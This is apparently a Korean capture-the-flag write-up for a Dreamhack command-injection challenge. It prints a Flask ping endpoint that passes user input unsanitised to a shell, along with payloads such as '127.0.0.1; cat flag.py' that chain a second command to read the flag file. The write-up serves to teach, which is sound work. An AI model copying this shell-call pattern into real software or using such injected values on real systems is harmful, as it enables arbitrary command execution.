# [Dreamhack Wargame] command-injection-chatgpt
* 출처: 🚩 command-injection-chatgpt [🔗](https://dreamhack.io/wargame/challenges/768)
* Reference: Command Injection
* 문제 설명
  <br/><br/>
  <img width="816" alt="command-injection-chatgpt_문제 설명" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/e240250a-5f9d-45f1-aed4-c3775ae2db58">

<br/><br/>

## 문제 파일(app.py) 및 취약점 분석
```python
#!/usr/bin/env python3
import subprocess

from flask import Flask, request, render_template, redirect

from flag import FLAG

APP = Flask(__name__)

# 인덱스 페이지
@APP.route('/')
def index():
    return render_template('index.html') # 인덱스 페이지를 render_template 함수로 화면에 출력함

# ping 페이지
@APP.route('/ping', methods=['GET', 'POST'])
def ping():
    if request.method == 'POST': # POST 메소드로 요청 시
        host = request.form.get('host') # 이용자가 입력한 host 값을 가져옴
        cmd = f'ping -c 3 {host}' # ping 명령을 생성함 (3개의 echo request를 host로 전송함)
        try:
            output = subprocess.check_output(['/bin/sh', '-c', cmd], timeout=5)
            
            # 정상적인 ping response를 수신한 경우 ping 명령의 수행 결과를 화면에 출력함
            return render_template('ping_result.html', data=output.decode('utf-8'))
            
        except subprocess.TimeoutExpired: # 타임아웃 발생
            return render_template('ping_result.html', data='Timeout !')
            
        except subprocess.CalledProcessError: # 명령 수행 시 에러 발생
            return render_template('ping_result.html', data=f'an error occurred while executing the command. -> {cmd}')

    # GET 메소드로 요청 시
    return render_template('ping.html') # 이용자에게 ping 명령을 수행하기 위해 필요한 Host를 입력 받는 페이지(ping.html)를 화면에 출력함


if __name__ == '__main__':
    APP.run(host='0.0.0.0', port=8000)
```
* ping 페이지에서 이용자가 입력한 ```host```를 별다른 검증 없이 ping 명령어에 사용하고 있어 ```&&``` (명령어 연속 실행), ```;``` (명령어 구분자), ```|``` (파이프) 등과 같이 명령어를 연속으로 실행시키는 메타 문자를 사용해 임의 명령을 함께 실행시킬 수 있음
    - 공격을 위해 입력해야 하는 값의 목록 (하나만 선택)
        | 사용하는 메타 문자 | ```host``` (이용자의 입력값) |
        |:---:|------|
        | ```&&``` (명령어 연속 실행) | ```127.0.0.1 && cat flag.py``` |
        | ```;``` (명령어 구분자) | ```127.0.0.1; cat flag.py``` |
        | ```\|``` (파이프) | ```127.0.0.1 \| cat flag.py``` |
        + FLAG는 flag.py에 있으므로 **flag.py 파일의 내용을 화면(stdout)에 출력하기 위한 cat 명령어**를 사용함 → ```cat flag.py```

<br/><br/>

## 문제 풀이 (익스플로잇)
Host에 ```127.0.0.1 | cat flag.py```를 입력한 후 [Ping!] 버튼을 클릭하면 Ping Result 페이지에서 ```cat flag.py``` 명령어 수행 결과로 출력된 FLAG를 획득할 수 있음
<br/><br/>
<img width="1512" alt="command-injection-chatgpt_문제 풀이" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/b2675f31-52f8-4ed0-8d94-88402cbb4b7f"><br/>

* 명령어 연속 실행(```&&```), 명령어 구분자(```;```) 메타 문자를 사용하는 경우의 익스플로잇 결과
  <br/><br/>
  <img width="1512" alt="command-injection-chatgpt_문제 풀이(추가 자료)" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/14240350-f3c5-4caf-a74a-7753df4fb2d9"><br/>
